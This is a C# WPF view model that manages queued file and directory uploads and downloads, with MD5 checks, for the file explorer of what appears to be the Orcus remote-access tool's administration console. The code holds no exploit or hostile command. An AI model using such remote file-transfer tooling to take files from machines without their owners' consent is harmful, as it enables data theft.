using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Data;
using NLog;
using Orcus.Administration.Commands.FileExplorer;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Shared.Utilities;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels.FileExplorer
{
    public class FileTransferManagerViewModel : PropertyChangedBase
    {
        private const int BufferSize = 4096;
        private readonly Dictionary<Guid, Downloader> _downloaders;
        private readonly FileExplorerCommand _fileExplorerCommand;
        private readonly Queue<FileTransferTask> _fileQueue;
        private RelayCommand _closeCommand;
        private List<int> _completedFileTransfers;
        private FileTransferTask _currentTask;
        private bool? _dialogResult;
        private bool _isActive;
        private double _progress;

        public FileTransferManagerViewModel(FileExplorerCommand fileExplorerCommand)
        {
            _fileQueue = new Queue<FileTransferTask>();
            _fileExplorerCommand = fileExplorerCommand;
            _downloaders = new Dictionary<Guid, Downloader>();
            FileTransferTasks = new ObservableCollection<FileTransferTask>();
            CollectionView = CollectionViewSource.GetDefaultView(FileTransferTasks);
            CollectionView.GroupDescriptions.Add(new PropertyGroupDescription(nameof(FileTransferTask.IsFinished)));
        }

        public double Progress
        {
            get { return _progress; }
            set { SetProperty(value, ref _progress); }
        }

        public bool IsActive
        {
            get { return _isActive; }
            set { SetProperty(value, ref _isActive); }
        }

        public FileTransferTask CurrentTask
        {
            get { return _currentTask; }
            set { SetProperty(value, ref _currentTask); }
        }

        public bool? DialogResult
        {
            get { return _dialogResult; }
            set { SetProperty(value, ref _dialogResult); }
        }

        public ObservableCollection<FileTransferTask> FileTransferTasks { get; }
        public ICollectionView CollectionView { get; }

        public RelayCommand CloseCommand
        {
            get { return _closeCommand ?? (_closeCommand = new RelayCommand(parameter => { DialogResult = true; })); }
        }

        public event EventHandler<FileEntry> FileUploaded;
        public event EventHandler<FileTransferTask> BeginFileUpload;

        public void UploadFiles(IEnumerable<string> fileNames, string targetPath)
        {
            lock (_fileQueue)
            {
                foreach (var fileName in fileNames)
                {
                    var entry = new FileTransferTask(fileName,
                        Path.Combine(targetPath, Path.GetFileName(fileName)), true, false);
                    FileTransferTasks.Add(entry);
                    _fileQueue.Enqueue(entry);
                    BeginFileUpload?.Invoke(this, entry);
                }

                UpdateProgress();

                if (_isActive)
                    return;

                BeginWorking();
            }
        }

        public void DownloadFiles(IEnumerable<string> fileNames, string targetPath)
        {
            lock (_fileQueue)
            {
                foreach (var fileName in fileNames)
                {
                    var entry = new FileTransferTask(fileName, Path.Combine(targetPath, Path.GetFileName(fileName)),
                        false, false);
                    FileTransferTasks.Add(entry);
                    _fileQueue.Enqueue(entry);
                }

                UpdateProgress();

                if (_isActive)
                    return;

                BeginWorking();
            }
        }

        public void DownloadDirectories(IEnumerable<string> directoryPaths, string targetPath)
        {
            lock (_fileQueue)
            {
                foreach (var fileName in directoryPaths)
                {
                    var entry = new FileTransferTask(fileName,
                        Path.Combine(targetPath, Path.GetFileName(fileName)), false, true);
                    FileTransferTasks.Add(entry);
                    _fileQueue.Enqueue(entry);
                }

                UpdateProgress();

                if (_isActive)
                    return;

                BeginWorking();
            }
        }

        public void PackageReceived(byte[] data, int index)
        {
            var guid = new Guid(data.Skip(index).Take(16).ToArray());
            Downloader downloader;
            if (_downloaders.TryGetValue(guid, out downloader))
                downloader.ReceiveData(data, index + 16);
            //else
            //Debug.Fail("Why the hell do we receive a package for a non existing download task?");
            //because of a canceled task
        }

        public void DownloadFailed(Guid downloadGuid)
        {
            Downloader downloader;
            if (_downloaders.TryGetValue(downloadGuid, out downloader))
                downloader.Fail();
        }

        private async void BeginWorking()
        {
            IsActive = true;
            while (true)
            {
                FileTransferTask fileTransferTask;
                lock (_fileQueue)
                {
                    if (_fileQueue.Count == 0)
                        break;

                    fileTransferTask = _fileQueue.Dequeue();
                }

                if (fileTransferTask.IsCanceled)
                {
                    fileTransferTask.State = FileProcessEntryState.Canceled;
                    continue;
                }

                CurrentTask = fileTransferTask;

                if (fileTransferTask.IsUpload && !fileTransferTask.IsDirectory)
                {
                    await Task.Run(() => UploadEntry(fileTransferTask));
                }
                else if (!fileTransferTask.IsUpload && !fileTransferTask.IsDirectory)
                {
                    await
                        Task.Run(
                            () =>
                                DownloadEntry(fileTransferTask.Path, fileTransferTask.TargetPath, false,
                                    fileTransferTask));
                }
                else if (!fileTransferTask.IsUpload && fileTransferTask.IsDirectory)
                {
                    await
                        Task.Run(
                            () =>
                                DownloadEntry(fileTransferTask.Path, fileTransferTask.TargetPath, true,
                                    fileTransferTask));
                }
            }
            IsActive = false;
            Progress = 1;
            _completedFileTransfers = FileTransferTasks.Select(x => FileTransferTasks.IndexOf(x)).ToList();
        }

        /// <param name="path">The remote path</param>
        /// <param name="targetPath">The local path</param>
        private void DownloadEntry(string path, string targetPath, bool isDirectory, FileTransferTask fileTransferTask)
        {
            fileTransferTask.State = FileProcessEntryState.Preparing;
            fileTransferTask.IsWorking = true;

            var downloadGuid = Guid.NewGuid();
            ;
            var downloadFilePath = isDirectory
                ? FileExtensions.MakeDirectoryUnique(targetPath + "_download")
                : FileExtensions.MakeUnique(targetPath);

            var downloader = new Downloader(downloadFilePath, fileTransferTask);
            _downloaders.Add(downloadGuid, downloader);
            try
            {
                using (downloader)
                {
                    var info = _fileExplorerCommand.InitializeDownload(path, isDirectory, downloadGuid);
                    if (info.Result != DownloadResult.Succeed)
                    {
                        _downloaders.Remove(downloadGuid);
                        fileTransferTask.State = FileProcessEntryState.FileNotFound;
                        return;
                    }

                    fileTransferTask.State = FileProcessEntryState.Busy;
                    fileTransferTask.Size = info.Size;

                    var isCanceled = false;

                    EventHandler eventHandler = (sender, args) =>
                    {
                        isCanceled = true;
                        _fileExplorerCommand.CancelDownload(downloadGuid);
                        downloader.Waiter.Set();
                        downloader.Dispose();
                    };

                    fileTransferTask.CancelRequest += eventHandler;

                    downloader.Size = info.Size;
                    downloader.CheckFinished();

                    downloader.ProgressChanged += (sender, args) => UpdateProgress();
                    downloader.Waiter.WaitOne();
                    fileTransferTask.CancelRequest -= eventHandler;
                    _downloaders.Remove(downloadGuid);

                    if (isCanceled)
                    {
                        fileTransferTask.State = FileProcessEntryState.Canceled;
                        return;
                    }
                    else if (!downloader.Success)
                    {
                        fileTransferTask.State = FileProcessEntryState.Failed;
                        return;
                    }
                    else
                    {
                        fileTransferTask.Progress = 1;
                        fileTransferTask.ProcessedSize = downloader.Size;
                        fileTransferTask.EstimatedTime = TimeSpan.Zero;
                        UpdateProgress();
                    }

                    byte[] hash;
                    using (var md5CryptoService = new MD5CryptoServiceProvider())
                        hash = md5CryptoService.ComputeHash(downloader.FileStream);

                    if (!hash.SequenceEqual(info.Hash))
                    {
                        fileTransferTask.State = FileProcessEntryState.HashValuesNotMatch;
                        return;
                    }
                }

                if (fileTransferTask.IsDirectory)
                {
                    fileTransferTask.State = FileProcessEntryState.UnpackingDirectory;
                    var targetDirectory = FileExtensions.MakeDirectoryUnique(targetPath);
                    ZipFile.ExtractToDirectory(downloadFilePath, targetDirectory);
                    File.Delete(downloadFilePath);
                }

                fileTransferTask.State = FileProcessEntryState.Succeed;
            }
            catch (Exception exception)
            {
                fileTransferTask.State = FileProcessEntryState.Failed;
                LogManager.GetCurrentClassLogger().Error(exception, "Upload failed");
            }
            finally
            {
                fileTransferTask.IsWorking = false;
                fileTransferTask.IsFinished = true;
            }
        }

        private void UploadEntry(FileTransferTask fileTransferTask)
        {
            fileTransferTask.State = FileProcessEntryState.Preparing;
            fileTransferTask.IsWorking = true;

            try
            {
                var fileInfo = new FileInfo(fileTransferTask.Path);
                if (!fileInfo.Exists)
                {
                    fileTransferTask.State = FileProcessEntryState.FileNotFound;
                    return;
                }

                using (var fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read))
                {
                    fileTransferTask.Size = fileStream.Length;

                    using (var md5Service = new MD5CryptoServiceProvider())
                        fileTransferTask.HashValue = md5Service.ComputeHash(fileStream);

                    fileStream.Position = 0;

                    fileTransferTask.State = FileProcessEntryState.Busy;

                    var sessionGuid = _fileExplorerCommand.RequestFileUpload(fileTransferTask.TargetPath,
                        fileTransferTask.HashValue, fileStream.Length);

                    var packets = (int) Math.Ceiling(fileStream.Length/(double) BufferSize);
                    var remainingLength = fileStream.Length;
                    var lastSlowValuesUpdate = DateTime.UtcNow;
                    var lastProgressUpdate = DateTime.UtcNow;

                    int dataDownloadedSinceLastUpdate = 0;

                    for (int i = 0; i < packets; i++)
                    {
                        int currentPacketLength;
                        if (remainingLength > BufferSize)
                        {
                            currentPacketLength = BufferSize;
                            remainingLength -= BufferSize;
                        }
                        else
                        {
                            currentPacketLength = (int) remainingLength;
                        }

                        var buffer = new byte[currentPacketLength];
                        fileStream.Read(buffer, 0, currentPacketLength);
                        _fileExplorerCommand.SendUploadPackage(sessionGuid, buffer);

                        dataDownloadedSinceLastUpdate += currentPacketLength;

                        var slowUpdateTimeDifference = DateTime.UtcNow - lastSlowValuesUpdate;
                        if (slowUpdateTimeDifference > TimeSpan.FromMilliseconds(400))
                        {
                            fileTransferTask.Speed = dataDownloadedSinceLastUpdate/slowUpdateTimeDifference.TotalSeconds;
                            fileTransferTask.EstimatedTime = TimeSpan.FromSeconds(remainingLength/fileTransferTask.Speed);

                            lastSlowValuesUpdate = DateTime.UtcNow;
                            dataDownloadedSinceLastUpdate = 0;
                        }

                        if (DateTime.UtcNow - lastProgressUpdate > TimeSpan.FromMilliseconds(50))
                        {
                            fileTransferTask.Progress = fileTransferTask.ProcessedSize/(double) fileStream.Length;
                            fileTransferTask.ProcessedSize = fileStream.Length - remainingLength;
                            UpdateProgress();

                            lastProgressUpdate = DateTime.UtcNow;
                        }

                        if (fileTransferTask.IsCanceled)
                        {
                            fileTransferTask.State = FileProcessEntryState.Canceled;
                            fileTransferTask.EstimatedTime = TimeSpan.Zero;
                            fileTransferTask.Speed = 0;

                            _fileExplorerCommand.CancelFileUpload(sessionGuid);
                            return;
                        }

                        fileTransferTask.UpdateProgress();
                    }

                    fileTransferTask.Progress = 1;
                    fileTransferTask.ProcessedSize = fileStream.Length;
                    fileTransferTask.EstimatedTime = TimeSpan.Zero;
                    UpdateProgress();
                    fileTransferTask.UpdateProgress();

                    var finished = _fileExplorerCommand.FinishFileUpload(sessionGuid);
                    switch (finished)
                    {
                        case UploadResult.Succeed:
                            fileTransferTask.State = FileProcessEntryState.Succeed;

                            FileUploaded?.Invoke(this,
                                new FileEntry
                                {
                                    CreationTime = fileInfo.CreationTime,
                                    LastAccess = fileInfo.LastAccessTime,
                                    Name = fileInfo.Name,
                                    Path = fileTransferTask.TargetPath,
                                    Size = fileInfo.Length
                                });
                            break;
                        case UploadResult.HashValuesDoNotMatch:
                            fileTransferTask.State = FileProcessEntryState.HashValuesNotMatch;
                            break;
                        case UploadResult.InvalidFileLength:
                            fileTransferTask.State = FileProcessEntryState.InvalidFileLength;
                            break;
                        default:
                            fileTransferTask.State = FileProcessEntryState.Failed;
                            break;
                    }

                    fileTransferTask.Progress = 1;
                    fileTransferTask.EstimatedTime = TimeSpan.Zero;
                    fileTransferTask.Speed = 0;
                }
            }
            catch (Exception exception)
            {
                fileTransferTask.State = FileProcessEntryState.Failed;
                LogManager.GetCurrentClassLogger().Error(exception, "Upload failed");
            }
            finally
            {
                fileTransferTask.IsWorking = false;
                fileTransferTask.IsFinished = true;
            }
        }

        private void UpdateProgress()
        {
            long totalSize = 0;
            double processedSize = 0;
            for (int i = 0; i < FileTransferTasks.Count; i++)
            {
                if (_completedFileTransfers != null && _completedFileTransfers.Contains(i))
                    continue;

                var entry = FileTransferTasks[i];
                totalSize += entry.Size;
                processedSize += entry.ProcessedSize;
            }

            Progress = processedSize/totalSize;
        }
    }
}